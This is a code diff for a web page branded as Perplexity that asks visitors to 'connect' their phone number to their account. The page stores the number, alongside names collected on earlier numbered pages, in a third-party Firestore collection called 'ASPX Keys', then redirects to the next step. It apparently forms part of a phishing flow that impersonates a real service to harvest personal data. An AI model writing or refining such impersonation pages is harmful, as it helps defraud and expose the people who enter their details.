@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Mobile - Perplexity</title>
+    <title>Connect Mobile Number - Perplexity</title>
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
@@ -58,14 +58,14 @@
             padding: 18px 24px;
             font-size: 18px;
             border: 1px solid #d1d1d6;
-            /* Matches Image Rounded Corners */
-            border-radius: 24px; 
+            /* Fixed High Radius as per Image */
+            border-radius: 28px; 
             outline: none;
             transition: border-color 0.2s;
             color: #000;
         }
 
-        /* Black focus color */
+        /* Focus color set to BLACK */
         input:focus {
             border-color: #000;
         }
@@ -98,7 +98,7 @@
             color: #fff;
             border: none;
             padding: 16px;
-            border-radius: 30px;
+            border-radius: 30px; 
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
@@ -123,7 +123,8 @@
         <p class="description">Connect Your Phone Number to signing in to your Perplexity Account</p>
 
         <div class="input-wrapper">
-            <input type="text" id="mobile" placeholder="+91 1234567890" autocomplete="off">
+            <!-- Max length set to allow +code, space, and 10 digits -->
+            <input type="text" id="mobile" placeholder="+91 1234567890" autocomplete="off" maxlength="16">
             <div id="error" class="error-msg">Please enter a valid 10-digit number.</div>
         </div>
 
@@ -147,6 +148,7 @@
             measurementId: "G-6ZP1FPMKSJ"
         };
 
+        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
@@ -154,70 +156,63 @@
         const continueBtn = document.getElementById('continueBtn');
         const errorDiv = document.getElementById('error');
 
-        // Handles auto-spacing for any country code starting with +
+        // Retrieve the document ID saved from the previous page (e.g., 1065080509)
+        const docId = localStorage.getItem('currentDocId') || "1065080509"; 
+
+        // Handle space after country code automatically
         mobileInput.addEventListener('input', (e) => {
             let val = e.target.value;
-            // If user types + followed by digits, add space after the code
-            if (val.startsWith('+')) {
-                // Remove existing spaces to re-format
-                let clean = val.replace(/\s/g, '');
-                if (clean.length > 3) {
-                    // Logic for 2-3 digit country codes (e.g. +91 or +1)
-                    let code = clean.substring(0, 3);
-                    let number = clean.substring(3);
-                    e.target.value = code + ' ' + number;
-                }
+            // If user types + followed by 1 or more digits, ensures there is a space before the number
+            if (val.startsWith('+') && !val.includes(' ') && val.length >= 3) {
+                mobileInput.value = val.slice(0, 3) + ' ' + val.slice(3);
             }
         });
 
         async function validateAndSubmit() {
-            const rawVal = mobileInput.value.trim();
+            const fullVal = mobileInput.value.trim();
             
-            // Regex to ensure exactly 10 digits are present at the end
+            // Matches optional country code + space, then EXACTLY 10 digits
             const regex = /(\d{10})$/;
-            const match = rawVal.match(regex);
+            const match = fullVal.match(regex);
 
-            if (match && match[0].length === 10) {
+            if (match && match[1].length === 10) {
                 errorDiv.style.display = 'none';
-                saveAndRedirect(rawVal);
+                saveData(fullVal);
             } else {
                 errorDiv.style.display = 'block';
             }
         }
 
-        async function saveAndRedirect(fullNumber) {
-            continueBtn.innerText = "Verifying...";
+        async function saveData(fullNumberString) {
+            continueBtn.innerText = "Connecting...";
             continueBtn.classList.add('loading');
 
-            // --- IMPORTANT ---
-            // This retrieves the doc ID (e.g. 1065080509) used in previous steps
-            // Make sure your previous page stores it as: localStorage.setItem('userDocId', '1065080509');
-            const docId = localStorage.getItem('userDocId') || "1065080509"; 
-
             try {
+                // Update the SAME document that contains firstName, lastName etc.
                 const docRef = db.collection("ASPX Keys").doc(docId);
                 
-                // Using merge: true stores it in the SAME document with firstName/lastName
                 await docRef.set({
-                    mobileNumber: fullNumber,
+                    mobileNumber: fullNumberString,
                     updatedAt: new Date().toLocaleString() + " UTC+5:30"
                 }, { merge: true });
 
-                // Redirecting to 6.html with the ID as a session parameter
-                window.location.href = `6.html?id=${docId}`;
-
+                // Success: Redirect to 6.html with sessionId
+                window.location.href = "6.html?sessionid=" + docId;
             } catch (err) {
-                console.error("Storage Error: ", err);
-                alert("Connection failed. Please check your network.");
+                console.error("Error: ", err);
+                alert("Storage failed. Check your internet connection.");
                 continueBtn.innerText = "Continue";
                 continueBtn.classList.remove('loading');
             }
         }
 
+        // Event Listeners
         continueBtn.addEventListener('click', validateAndSubmit);
 
         mobileInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') validateAndSubmit();
+            if (e.key === 'Enter') {
+                validateAndSubmit();
+            }
         });
     </script>
 </body>
